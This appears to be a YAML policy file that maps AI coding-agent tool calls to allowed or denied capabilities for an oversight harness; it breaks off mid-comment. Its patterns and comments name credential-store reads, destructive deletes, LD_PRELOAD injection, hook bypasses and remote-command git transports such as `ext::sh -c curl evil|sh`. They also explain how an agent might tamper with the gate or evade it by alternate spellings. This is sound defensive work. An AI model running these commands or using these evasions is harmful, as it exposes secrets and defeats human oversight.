---
schema: ego.matchers/1
id: matchers
title: Operation to capability matchers
notes: >
  Matchers are evaluated in order; the first match wins. Bash commands are split into segments on `&&`, `||`, `;` and
  `|`; leading `VAR=value` assignments, `sudo`, `env`, `nice`, `time`, `xargs` prefixes and the global option flags of
  `git`, `gh` and `glab` (`git -C dir`, `git -c k=v`, `--git-dir`, `gh -R owner/repo`, …) are stripped before matching;
  a `-c core.hooksPath=…` option surfaces as a `git config core.hooksPath` segment; output redirections (`>`, `>>`) are
  classified as writes to their target path;
  every segment must be allowed for the command to be allowed and the most restrictive verdict wins. `command` patterns
  are regular expressions applied to the normalized segment; `path` patterns are glob-like prefixes applied to the
  resolved path relative to the workspace root or to the home directory (prefix `~/`); `url` patterns match hostnames.
matchers:
  # --- acts whose SPELLING differs from the one already named, placed first because matching is
  # first-match-wins per segment and a friendlier rule for the same head sits below (exit review 6) ---
  # `git stash --all` stashes UNTRACKED AND IGNORED files too, which is every generated artifact and the whole
  # `.harness` governance tree; `--include-untracked` is the same act one step smaller (exit review 6).
  - capability: ego.runtime.tamper
    tool: Bash
    command: '^git\s+stash\b[^|;&]*\s(--all|-a)\b'
  # `less`/`more`/`view` take an INITIAL COMMAND, and `!` runs it through a shell. A pager is bounded only while
  # it is paging (exit review 6).
  - capability: command.script-opaque
    tool: Bash
    command: '^(less|more|most|view|vim?|nvim)\b[^|;&]*?(\+\s*!|-c\s+!|--cmd\s+)'
  # `git send-pack` and `git subtree push` write refs on a remote: the same act `git push` names, and the
  # organization locks the act, not the spelling.
  - capability: git.remote.push
    tool: Bash
    command: '^git\s+(send-pack|subtree\s+push)\b'
  # A container CONTEXT is a name for an engine, and creating or updating one WRITES that binding — after which
  # every later command that names it reaches whatever it points at (exit review 6).
  - capability: container.nonlocal.run
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+context\s+(create|update|import|rm|remove)\b'
  # --- hook and gate self-protection (absolute) ---
  - capability: ego.gate.bypass
    tool: Bash
    command: '(^|\s|/)(harness|ego|harness\.js|ego\.js|ego-hook\.sh|git-hook\.sh)(\s+hook\b|\s+(claude-code|codex-cli)\s+(SessionStart|UserPromptSubmit|PreToolUse|PostToolUse|SubagentStart|SubagentStop|Stop|SessionEnd)\b)'
  - capability: ego.gate.bypass
    tool: Bash
    command: '(^|\s)(npx|bunx|pnpx)\s+(harness|ego|@tarscoff/ego)\s+hook\b'
  - capability: ego.gate.bypass
    tool: Bash
    command: '(^|\s)hook\s+(claude-code|codex-cli)\s+(SessionStart|UserPromptSubmit|PreToolUse|PostToolUse|SubagentStart|SubagentStop|Stop|SessionEnd)\b'
  - capability: ego.gate.bypass
    tool: Bash
    command: '(^|\s)(decision\s+answer|budget\s+extend|modes\s+set|sources\s+(add|remove))(\s|$)'
  - capability: command.env-inject
    tool: Bash
    command: '^\x00ego\x00env-inject\s+(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_|BASH_ENV|ENV$|PS4|BASH_XTRACEFD|PROMPT_COMMAND|NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT|GIT_|EGO_|CLAUDE_|CODEX_|SSH_ASKPASS|SUDO_ASKPASS|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|IFS|SHELL$)'
  - capability: command.env-override
    tool: Bash
    command: '^\x00ego\x00env-inject\s+'
  - capability: git.alias.inline
    tool: Bash
    command: '^git\s+(alias-override|alias-shell|alias-opaque)\b'
  - capability: ego.runtime.tamper
    tool: Bash
    command: '(^|\s)(\b(cp|mv|tee|ln|install|dd|rsync|sed\s+-i|perl\s+-p?i|truncate|rm|chmod|chown|touch|python3?|node)\b|>>?)[^|;&]*\.harness/(runtime|generated|hooks)(/|\b)'
  - capability: ego.runtime.tamper
    tool: Bash
    command: '(^|\s)(\b(cp|mv|tee|ln|install|dd|rsync|sed\s+-i|perl\s+-p?i|truncate|rm|chmod|chown|touch)\b|>>?)[^|;&]*\.harness/harness\.md'
  - capability: ego.launcher.invoke-nested
    tool: Bash
    command: '^(claude|codex)(\s|$)'
  - capability: ego.launcher.invoke-nested
    tool: Bash
    command: '^(script|expect|unbuffer)\b'
  - capability: ego.gate.bypass
    tool: Write
    path: '.harness/runtime/decisions/**'
  - capability: ego.gate.bypass
    tool: Edit
    path: '.harness/runtime/decisions/**'
  - capability: ego.runtime.tamper
    tool: Write
    path: '.harness/runtime/**'
  - capability: ego.runtime.tamper
    tool: Write
    path: '.harness/generated/**'
  - capability: ego.runtime.tamper
    tool: Write
    path: '.harness/hooks/**'
  - capability: ego.runtime.tamper
    tool: Write
    path: '.harness/harness.md'
  # EGO_HOME is EGO's OWN runtime state: the index that says which runtime is trusted, the cache it is loaded
  # from, the pins. Protecting only `trust/` left `~/.ego/index.json` writable, and that file decides which
  # runtime EGO believes in (exit review).
  - capability: ego.trust.tamper
    tool: Write
    path: '~/.ego/**'
  - capability: ego.trust.tamper
    tool: Edit
    path: '~/.ego/**'
  - capability: ego.trust.tamper
    tool: Write
    path: '~/.ego/trust/**'
  - capability: ego.trust.tamper
    tool: Bash
    command: '(^|\s)(rm|mv|cp|tee|sed\s+-i|truncate|chmod)\b.*\.ego/(trust|index|releases|runtimes)/'
  # --- git remote (organization-locked) ---
  - capability: git.remote.push.force
    tool: Bash
    command: '^git\s+push\b.*(\s--force(-with-lease)?\b|\s-f\b|\s\+)'
  - capability: git.remote.tag.delete
    tool: Bash
    command: '^git\s+push\b.*(--delete|\s:refs/tags/|\s:[A-Za-z0-9._/-]*tag)'
  - capability: git.remote.branch.delete
    tool: Bash
    command: '^git\s+push\b.*(--delete\b|\s:[A-Za-z0-9._/-]+)'
  - capability: git.remote.tag.push
    tool: Bash
    command: '^git\s+push\b.*(--tags\b|\srefs/tags/)'
  - capability: git.remote.push
    tool: Bash
    command: '^git\s+push\b'
  - capability: git.hooks.bypass
    tool: Bash
    command: '^git\s+commit\b.*\s--no-verify\b'
  - capability: git.hooks.bypass
    tool: Bash
    command: '^git\s+(push|merge|pull|rebase|cherry-pick|revert|am)\b.*\s--no-verify\b'
  - capability: git.hooks.bypass
    tool: Bash
    # `-c core.hooksPath=…` is a bypass wherever it sits, including AFTER the verb (`git clone -c core.hooksPath=…`,
    # round 13). Reading the value back (`--get`) is not a change.
    # NEITHER IS READING IT BY NAME. `git config core.hooksPath` with nothing after it PRINTS the value — the
    # first thing anyone does when auditing a checkout — and it was absolutely denied, which left no way to look
    # (exit review 8). The rule now requires a VALUE: an `=` (the `-c NAME=VALUE` form) or a further word.
    command: '^git\b(?![^|;&]*\s--get\b)[^|;&]*core\.hooksPath(=|\s+\S)'
  - capability: git.hooks.bypass
    tool: Bash
    command: '^git\s+(commit-tree|update-ref)\b'
  # --- forge CLIs (organization-locked PR and issue mutation, narrow writes) ---
  - capability: forge.pr.merge
    tool: Bash
    command: '^(gh\s+pr\s+merge|glab\s+mr\s+merge|az\s+repos\s+pr\s+update\b.*--status\s+completed)\b'
  - capability: forge.pr.create
    tool: Bash
    command: '^(gh\s+pr\s+create|glab\s+mr\s+create|az\s+repos\s+pr\s+create)\b'
  - capability: forge.pr.close
    tool: Bash
    command: '^(gh\s+pr\s+close|glab\s+mr\s+close)\b'
  - capability: forge.pr.approve
    tool: Bash
    command: '^(gh\s+pr\s+review\b.*--approve|glab\s+mr\s+approve)\b'
  - capability: forge.pr.modify
    tool: Bash
    command: '^(gh\s+pr\s+(edit|ready|reopen|lock|unlock)|glab\s+mr\s+(update|reopen))\b'
  - capability: forge.release.publish
    tool: Bash
    command: '^(gh\s+release\s+(create|upload|edit)|glab\s+release\s+(create|upload))\b'
  - capability: forge.issue.close
    tool: Bash
    command: '^(gh\s+issue\s+close|glab\s+issue\s+close)\b'
  - capability: forge.issue.create
    tool: Bash
    command: '^(gh\s+issue\s+create|glab\s+issue\s+create)\b'
  - capability: forge.issue.edit
    tool: Bash
    command: '^(gh\s+issue\s+(edit|transfer|pin|lock)|glab\s+issue\s+update)\b'
  - capability: forge.issue.comment
    tool: Bash
    command: '^(gh\s+issue\s+comment|glab\s+issue\s+note)\b'
  - capability: forge.review.comment
    tool: Bash
    command: '^(gh\s+pr\s+(comment|review)|glab\s+mr\s+note)\b'
  - capability: forge.pr.read
    tool: Bash
    command: '^(gh\s+pr\s+(view|list|diff|checks|status)|glab\s+mr\s+(view|list|diff))\b'
  - capability: forge.issue.read
    tool: Bash
    command: '^(gh\s+issue\s+(view|list|status)|glab\s+issue\s+(view|list))\b'
  - capability: forge.api.mutate
    tool: Bash
    command: '^(gh|glab)\s+api\s+graphql\b(?=[\s\S]*\bmutation\b)'
  - capability: forge.api.mutate
    tool: Bash
    # graphql body loaded from a file/stdin (field=@path): cannot inspect it, so a mutation cannot be ruled out -> fail closed
    command: '^(gh|glab)\s+api\s+graphql\b(?=[\s\S]*(=@|\s--input\b|\s-(\s|$)|=\s*[$`]))'
  - capability: forge.api.mutate
    tool: Bash
    command: '^(gh|glab)\s+api\b(?!\s+graphql\b)(?=.*(\s(-X|--method|--request)(\s+|=)?(POST|PUT|PATCH|DELETE)\b|\s(-f|-F|--field|--raw-field|--input|--form)(\s|=|\S*=)))'
  - capability: forge.api.mutate
    tool: Bash
    # the method arrives from a variable or a substitution: it cannot be shown to be a read, so it fails closed
    command: '^(gh|glab)\s+api\b(?=.*\s(-X|--method|--request)(\s+|=)?[$`])'
  - capability: forge.repo.read
    tool: Bash
    command: '^(gh\s+(repo\s+view|api)|glab\s+(repo\s+view|api))\b'
  # --- production (absolute; contexts named production/prod) ---
  - capability: production.k8s.mutate
    tool: Bash
    command: '^(kubectl|oc)\b(?=.*(--context[= ]\S*(prod|production)\S*|(^|\s)-n\s*\S*(prod|production)\S*|--namespace[= ]\S*(prod|production)\S*|--kubeconfig[= ]\S*(prod|production)\S*|--server[= ]\S*(prod|production)\S*))(?=.*\s(apply|delete|patch|edit|scale|rollout|create|replace|drain|cordon|uncordon|taint|exec|cp|annotate|label|set|expose|run|autoscale|attach|port-forward|debug|certificate|proxy)\b)'
  - capability: production.helm.mutate
    tool: Bash
    command: '^helm\b(?=.*\s(install|upgrade|uninstall|rollback|delete|test)\b)(?=.*(--kube-context[= ]\S*(prod|production)\S*|(^|\s)-n\s*\S*(prod|production)\S*|--namespace[= ]\S*(prod|production)\S*|--kubeconfig[= ]\S*(prod|production)\S*))'
  - capability: production.cloud.mutate
    tool: Bash
    # `cp`, `mv` and `sync` ARE DIRECTIONAL, and the direction is the whole effect. `aws s3 cp s3://fixtures/x .`
    # downloads INTO the workspace and changes nothing in the cloud; it was denied absolutely alongside
    # `aws s3 cp . s3://prod/`, which really does write there (exit review 8). The three verbs are matched only
    # when the DESTINATION is an `s3://` URI; `rm`, `rb` and `mb` have no such second reading and stay above.
    command: '^((terraform|tofu)\s+(?:-\S+\s+)*(apply|destroy)|pulumi\s+(?:-\S+\s+)*(up|destroy)|aws\s+(?:--\S+(?:\s+[^-]\S*)?\s+)*s3\s+(?:-\S+\s+)*(cp|mv|sync)\s+(?:-\S+\s+)*\S+\s+(?:-\S+\s+)*s3://|aws\s+(?:--\S+(?:\s+[^-]\S*)?\s+)*\S+\s+(create|delete|update|put|terminate|modify|remove|run-instances|start-instances|stop-instances|reboot-instances|rm|rb|mb|invoke|publish|associate|disassociate|attach|detach|authorize|revoke|batch-delete-image|delete-object|put-object|copy-object|delete-objects)|gcloud\s+(?!config\b|auth\b)\S+.*\b(create|delete|update|deploy|remove|rm)\b|az\s+\S+.*\b(create|delete|update|deploy|remove|purge)\b)'
  - capability: production.deploy
    tool: Bash
    command: '^(argocd\s+app\s+(sync|delete|set|rollback)|flux\s+(reconcile|suspend|resume)|kubectl\s+argo\s+rollouts)\b'
  - capability: production.dns.mutate
    tool: Bash
    command: '^(aws\s+(?:--\S+(?:\s+[^-]\S*)?\s+)*route53\s+change-resource-record-sets|gcloud\s+dns\s+record-sets\s+(create|update|delete)|az\s+network\s+dns\b.*\b(create|delete|update)\b)'
  - capability: production.iam.mutate
    tool: Bash
    command: '^(aws\s+(?:--\S+(?:\s+[^-]\S*)?\s+)*iam\s+(create|delete|attach|detach|put|update)|gcloud\s+iam\b.*\b(create|delete|add|remove)\b|az\s+role\s+assignment\s+(create|delete))'
  - capability: production.kms.mutate
    tool: Bash
    command: '^(aws\s+(?:--\S+(?:\s+[^-]\S*)?\s+)*kms\s+(create|schedule-key-deletion|disable|enable|put|update)|gcloud\s+kms\b.*\b(create|destroy|update)\b|az\s+keyvault\b.*\b(create|delete|set|update)\b)'
  - capability: production.secrets.mutate
    tool: Bash
    command: '^(vault\s+(kv\s+(put|delete|destroy)|write|delete)|aws\s+secretsmanager\s+(create|put|update|delete)|gcloud\s+secrets\s+(create|versions\s+add|delete))\b'
  # a database client aimed at a production host or connection string is a production mutation, not a local query.
  # (The general local-vs-remote target resolution lives in the evaluator; this catches the explicitly named case.)
  - capability: production.database.mutate
    tool: Bash
    command: '^(psql|mysql|mariadb|mysqladmin|mysqlsh|mongosh|mongo|redis-cli|valkey-cli|clickhouse(-client|\s+client)|cqlsh|influx|pg_dump|pg_dumpall|pg_restore|pgbench|createdb|dropdb|mysqldump|mysqlpump|mongodump|mongorestore)\b(?=[^|;&]*(-h\s*\S*(prod|production)\S*|--host[= ]\S*(prod|production)\S*|://[^\s/]*(prod|production)[^\s/]*))'
  # --- destructive roots (absolute) ---
  - capability: fs.destructive-root
    tool: Bash
    command: '^rm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*|-r\s+-f|-f\s+-r)\s+(/|~|\$HOME|\.|\*|/\*)(\s|$)'
  # --- credential stores (absolute writes, denied reads) ---
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.ssh/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.aws/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.config/gcloud/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.kube/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.netrc'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.npmrc'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.pypirc'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.config/gh/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.azure/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.docker/config.json'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.gnupg/**'
  - capability: fs.credential-store.write
    tool: Write
    path: '~/.git-credentials'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.ssh/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.aws/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.config/gcloud/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.kube/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.netrc'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.npmrc'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.pypirc'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.config/gh/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.azure/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.docker/config.json'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.gnupg/**'
  - capability: fs.credential-store.read
    tool: Read
    path: '~/.git-credentials'
  - capability: fs.credential-store.write
    tool: Bash
    command: '(^|\s)(\b(tee|cp|mv|install|ln|dd|rsync|sed\s+-i|perl\s+-p?i|truncate|chmod|chown|rm|ssh-keygen|ssh-add|ssh-copy-id|gpg\s+--import|gcloud\s+auth|az\s+login|kubectl\s+config|npm\s+(login|adduser|config\s+set|set))\b|>>?)[^|;&]*(~|\$HOME|\$\{HOME\}|/Users/[^/\s]+|/home/[^/\s]+|/root)/\.(ssh|aws|kube|netrc|npmrc|pypirc|config/gcloud|config/gh|azure|docker/config\.json|gnupg|git-credentials)\b'
  - capability: fs.credential-store.write
    tool: Bash
    command: '^(aws\s+configure\b|gcloud\s+auth\s+(login|activate-service-account)|az\s+login|gh\s+auth\s+login|glab\s+auth\s+login|npm\s+(login|adduser)|docker\s+login|vault\s+login)'
  - capability: fs.credential-store.read
    tool: Bash
    command: '(~|\$HOME|\$\{HOME\}|/Users/[^/\s]+|/home/[^/\s]+|/root)/\.(ssh|aws|kube|netrc|npmrc|pypirc|config/gcloud|config/gh|azure|docker/config\.json|gnupg|git-credentials)\b'
  - capability: fs.credential-store.read
    tool: Bash
    command: '(^|\s|=)\.(ssh|aws|kube|gnupg)/'
  # --- hook and control-plane protection ---
  - capability: ego.control-plane.edit
    tool: Write
    path: 'policies/organization/**'
  - capability: ego.control-plane.edit
    tool: Write
    path: 'control-plane/**'
  - capability: ego.control-plane.edit
    tool: Write
    path: 'policies/baselines/**'
  - capability: ego.control-plane.edit
    tool: Write
    path: 'policies/frameworks/**'
  - capability: ego.control-plane.edit
    tool: Write
    path: 'policies/schemas/**'
  - capability: ego.control-plane.edit
    tool: Write
    path: 'policies/templates/**'
  - capability: ego.mcp-trust.edit
    tool: Write
    path: '.harness/mcp-trust.md'
  # `.mcp.json` names the COMMAND each MCP server is started with, so writing it is writing what the host will
  # execute — the same surface as a hook entry (decision challenge, finding 20).
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.mcp.json'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.vscode/settings.json'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.cursor/**'
  # `node_modules/.bin` is a directory of PROGRAMS the toolchain executes by bare name: writing one of them and
  # then running `npx <name>` replaces what a bounded head binds to (decision challenge, findings 19, 35). A
  # package manager writes these in a subprocess EGO never sees; an agent writing one directly does not.
  - capability: fs.hook-config.write
    tool: Write
    path: '**/node_modules/.bin/**'
  - capability: fs.hook-config.write
    tool: Edit
    path: '**/node_modules/.bin/**'
  # `node_modules/.bin/<name>` is usually a SYMLINK into the package it belongs to, so protecting the link and not
  # its target left the composition open: write the target, then run the bare name. A package manager writes here
  # in a subprocess EGO never sees; an agent writing here directly deserves a human look.
  - capability: fs.dependency-tree.write
    tool: Write
    path: '**/node_modules/**'
  - capability: fs.dependency-tree.write
    tool: Edit
    path: '**/node_modules/**'
  # a kubeconfig names an exec-credential PROGRAM kubectl runs on every call
  - capability: fs.credential-store.write
    tool: Write
    path: '**/.kube/**'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.claude/settings.json'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.claude/settings.local.json'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.codex/**'
  - capability: fs.hook-config.write
    tool: Write
    path: '~/.claude/settings.json'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.git/hooks/**'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.husky/**'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.githooks/**'
  - capability: fs.hook-config.write
    tool: Edit
    path: '**/.githooks/**'
  - capability: fs.hook-config.write
    tool: Write
    path: '**/.claude/settings.local.json'
  - capability: fs.git-internals.write
    tool: Write
    path: '**/.git/**'
  - capability: fs.git-internals.write
    tool: Write
    path: '**/.git'
  - capability: fs.hook-config.write
    tool: Bash
    command: '(^|\s)(\b(chmod|chown|rm|mv|cp|ln|install|truncate|tee|touch|sed\s+-i|perl\s+-p?i)\b|>>?)[^|;&]*(\.git/hooks|\.husky/|\.githooks/|\.harness/hooks|\.claude/settings|\.codex/|core\.hooksPath)'
  - capability: fs.git-internals.write
    tool: Bash
    command: '(^|\s)(\b(chmod|chown|rm|mv|cp|ln|install|truncate|tee|touch|sed\s+-i|perl\s+-p?i)\b|>>?)[^|;&]*(^|\s|/)\.git/'
  - capability: fs.generated.write
    tool: Write
    path: 'policies/generated/**'
  - capability: fs.env-file.write
    tool: Write
    path: '**/.env'
  - capability: fs.env-file.write
    tool: Write
    path: '**/.env.*'
  - capability: fs.env-file.read
    tool: Read
    path: '**/.env'
  - capability: fs.env-file.read
    tool: Read
    path: '**/.env.*'
  # --- git local classes ---
  # Mutating branch, recovery and remote-configuration spellings are matched BEFORE the broad `status` matcher below:
  # it accepts a bare `branch`, `reflog` and `remote`, so every `git branch -f`, `git reflog expire` and
  # `git remote set-url` used to read as a listing and reach ALLOW (round 13).
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[^|;&]*\s(--upload-pack|--receive-pack|--exec)(=|\s)'
  # `-u` is the short form of --upload-pack for the transport verbs (it means something else for push/stash)
  - capability: git.alias.inline
    tool: Bash
    command: '^git\s+(clone|fetch|ls-remote|pull)\b[^|;&]*\s-u(\s+|)\S'
  # merge-index runs the program named as its first operand
  - capability: git.alias.inline
    tool: Bash
    command: '^git\s+merge-index\b'
  # `git clone --config k=v` is clone's own spelling of the global `-c k=v`, and it sits AFTER the verb where the
  # global-option stripper never looks. The same keys, the same effect: core.sshCommand and its neighbours name a
  # program git runs during the clone.
  # A CONFIG VALUE THAT STARTS WITH `!` IS A SHELL COMMAND, whatever the key is called. git's own convention
  # marks a shell-executed value that way — `submodule.<n>.update = !/tmp/pwn.sh` runs during a recursive clone
  # or update — and keying on the NAME could never cover it (exit review 8).
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[\s\S]*\s(-c|--config|--config-env)(=|\s+)[A-Za-z0-9._-]+=["'']?!'
  # `interactive.diffFilter` runs a shell command over the diff before `add -p` prints it, so it is a
  # program-valued key like the rest; the clone form sets it for every later command in the new repository.
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[^|;&]*\s(-c|--config)(=|\s+)[A-Za-z0-9.-]*\.(diffFilter|filter|command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshCommand|proxy|external|wrapper|exec|hooksPath|templateDir)='
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[^|;&]*\s--config(-env)?(=|\s+)(core\.(sshCommand|gitProxy|pager|editor|fsmonitor|hooksPath)|alias\.|filter\.|diff\.[^.]+\.(textconv|command)|credential\.|protocol\.|uploadpack\.|receive\.|include|includeIf)'
  # a remote-helper transport whose address IS a command: `git clone 'ext::sh -c curl evil|sh'`. The verb is a known
  # class but the operand names an unbounded program, so the class does not bound it — wherever it appears (clone,
  # fetch, remote add, submodule, config).
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[^|;&]*(\s|=|\"|\x27)ext::'
  # --ext-diff and --textconv run the externally configured program rather than git's own diff
  - capability: git.alias.inline
    tool: Bash
    command: '^git\b[^|;&]*\s--(ext-diff|textconv)\b'
  # `git <verb> --output=PATH` writes PATH with no other governance on it. ADDITIVE: this describes what the
  # command also DOES, not what it IS — `git clone --template=evil -o up URL` must still be judged as a hook
  # install, and letting a write-destination matcher win first-match turned that DENY into ALLOW (exit review 2).
  - capability: fs.repo.write
    tool: Bash
    additive: true
    command: '^git\b[^|;&]*\s(--output|-o)(=|\s)\S'
  # a clone template directory is copied into .git, hooks included: it installs hooks that then run
  - capability: git.hooks.bypass
    tool: Bash
    command: '^git\s+(clone|init)\b[^|;&]*\s--template(=|\s)'
  # a forcing refspec (leading +) overwrites a local branch, destroying unpushed commits
  - capability: git.local.reset
    tool: Bash
    command: '^git\s+(fetch|pull)\b[^|;&]*(\s\+\S+:\S|\s(-f|--force)\b[^|;&]*\s\S+:\S)'
  - capability: git.local.branch.delete
    tool: Bash
    command: '^git\s+branch\b[^|;&]*\s(-[a-zA-Z]*[dD][a-zA-Z]*|--delete)(\s|$)'
  - capability: git.local.reset
    tool: Bash
    command: '^git\s+branch\b[^|;&]*\s(-[a-zA-Z]*f[a-zA-Z]*|--force)(\s|$)'
  - capability: git.local.reset
    tool: Bash
    # `[\s\S]*` rather than `[^|;&]*`: the marker is appended by the NORMALIZER to a segment the splitter has
    # already decided is one command, so an operator inside a REF NAME — `git branch -M 'old;name' main` — must
    # not hide it (exit review 7).
    command: '^git\s+(checkout|switch|branch)\b[\s\S]*\s\x00ego\x00force-ref-reset(\s|$)'
  - capability: git.local.recovery.destroy
    tool: Bash
    command: '^git\s+(reflog\s+(expire|delete)|gc\b[^|;&]*--prune|stash\s+(clear|drop))\b'
  - capability: git.local.branch.delete
    tool: Bash
    command: '^git\s+tag\b[^|;&]*\s(-[a-zA-Z]*[df][a-zA-Z]*|--delete|--force)(\s|$)'
  - capability: git.remote.configure
    tool: Bash
    command: '^git\s+remote\s+(add|remove|rm|rename|set-url|set-branches|set-head|prune)\b'
  # `--pathspec-from-file=F` takes the pathspecs from a FILE, so the paths a checkout will overwrite are not on
  # the command line at all and nothing judged them.
  - capability: command.script-opaque
    tool: Bash
    command: '^git\s+(checkout|restore|add|rm|stash|commit)\b[^|;&]*--pathspec-from-file(=|\s)'
  # `git merge FETCH_HEAD` APPLIES WHATEVER THE LAST FETCH BROUGHT, from whatever URL that fetch named — and a
  # fetch from an arbitrary URL is itself ordinary. The merge rewrites tracked files, governed ones included,
  # with content that came off the network and no human saw (exit review 8). Merging a NAMED branch is ordinary
  # work and stays out of this.
  - capability: git.local.merge.network
    tool: Bash
    command: '^git\s+(merge|rebase|cherry-pick|reset)\b[^|;&]*\s(FETCH_HEAD|ORIG_HEAD)(\s|$)'
  # `git stash -u` / `--include-untracked` removes UNTRACKED files from the working tree as well as the tracked
  # ones — content that exists nowhere else, since it was never committed (exit review 8).
  - capability: command.destructive
    tool: Bash
    command: '^git\s+stash\b[^|;&]*\s(-[a-zA-Z]*u|--include-untracked)(\s|$)'
  # `git checkout .` and `git restore .` DISCARD every uncommitted change in the working tree — a repository-wide
  # destruction the command line does not enumerate, and the narrow-path spellings are judged on their paths.
  - capability: command.destructive
    tool: Bash
    command: '^git\s+(checkout|restore)\s+(--\s+)?(\.|\*|:/)\s*$'
  - capability: git.local.restore
    tool: Bash
    command: '^git\s+(checkout|switch)\b[^|;&]*\s(-[a-zA-Z]*f[a-zA-Z]*|--force|--discard-changes)(\s|$)'
  - capability: git.local.status
    tool: Bash
    command: '^git\s+(status|diff|log|blame|show|branch(\s+-[avr]+)?|reflog|remote\s+-v|remote\s+show|ls-files|rev-parse|describe|shortlog|worktree\s+list|stash\s+list)\b'
  - capability: git.remote.inspect
    tool: Bash
    command: '^git\s+(ls-remote|remote(\s+(-v|show|get-url))?)\b'
  - capability: git.remote.fetch
    tool: Bash
    command: '^git\s+fetch\b'
  - capability: git.remote.clone
    tool: Bash
    command: '^git\s+clone\b'
  - capability: git.remote.pull
    tool: Bash
    command: '^git\s+pull\b'
  - capability: git.local.amend
    tool: Bash
    command: '^git\s+commit\b.*--amend\b'
  - capability: git.local.commit
    tool: Bash
    command: '^git\s+commit\b'
  - capability: git.local.stage
    tool: Bash
    command: '^git\s+(add|rm\s+--cached|restore\s+--staged)\b'
  - capability: git.local.rebase
    tool: Bash
    command: '^git\s+rebase\b'
  - capability: git.local.reset
    tool: Bash
    command: '^git\s+reset\b'
  - capability: git.local.restore
    tool: Bash
    command: '^git\s+(restore|checkout\s+(--\s+)?\S+\.\S+|checkout\b[^|;&]*\s--\s+\S+)\b'
  - capability: git.local.clean
    tool: Bash
    command: '^git\s+clean\b'
  - capability: git.local.branch.delete
    tool: Bash
    command: '^git\s+branch\s+(-[dD]|--delete)\b'
  - capability: git.local.branch.create
    tool: Bash
    command: '^git\s+(branch\s+[^-]|checkout\s+-b|switch\s+-c)'
  - capability: git.local.checkout
    tool: Bash
    command: '^git\s+(checkout|switch)\b'
  - capability: git.local.stash
    tool: Bash
    command: '^git\s+stash\b'
  - capability: git.local.tag
    tool: Bash
    command: '^git\s+tag\b'
  - capability: git.local.merge
    tool: Bash
    command: '^git\s+merge\b'
  # A REVERT OR A CHERRY-PICK REWRITES WHATEVER THE NAMED COMMIT TOUCHED — a repository-determined set the command
  # line does not enumerate, which may include the commit that hardened the control plane. It was ALLOW, while
  # every other route to those same files is an absolute deny (exit review 7). It stays a normal, approvable act:
  # the human is shown which commit, which is the one fact the analyzer cannot supply.
  - capability: git.local.cherry-pick
    tool: Bash
    command: '^git\s+(cherry-pick|revert)\s+(--(continue|abort|skip|quit)\b|\s*$)'
  - capability: command.destructive
    tool: Bash
    command: '^git\s+(cherry-pick|revert)\b'
  - capability: git.worktree.remove
    tool: Bash
    command: '^git\s+worktree\s+(remove|prune)\b'
  # --- local runtime ---
  - capability: db.local.drop
    tool: Bash
    command: '^(dropdb|psql\b.*\bDROP\s+DATABASE|mysql\b.*\bDROP\s+DATABASE)'
  - capability: db.local.migrate
    tool: Bash
    command: '^(npx\s+)?(typeorm|prisma\s+migrate|alembic|flyway|liquibase|knex\s+migrate|sequelize\s+db:migrate|dbmate)\b'
  - capability: db.local.query
    tool: Bash
    # `mysqladmin` drops databases, `clickhouse client` is the two-word spelling of `clickhouse-client`, and the
    # createdb/dropdb/pgbench family talks to the same server with the same flags. Each was enrolled in the
    # target RESOLVER and missing from the matcher, so no capability matched and the resolver was never
    # consulted — the same drift between two lists of the same thing (exit review 7).
    command: '^(psql|mysql|mariadb|mysqladmin|mysqlsh|sqlite3|redis-cli|valkey-cli|mongosh|mongo|clickhouse(-client|\s+(client|local))|cqlsh|influx|pg_dump|pg_dumpall|pg_restore|pgbench|createdb|dropdb|createuser|dropuser|mysqldump|mysqlpump|mongodump|mongorestore|mongoexport|mongoimport)\b'
  - capability: db.local.start
    tool: Bash
    command: '^(pg_ctl|postgres|mysqld|redis-server|mongod)\b'
  # A container is only a boundary when it is actually a boundary. These options remove the isolation the runtime
  # would otherwise give, so the command inside is running on the host (challenge finding 4).
  - capability: command.privileged
    tool: Bash
    # every flag that removes the isolation the accepted container decision relies on. `--device` hands the
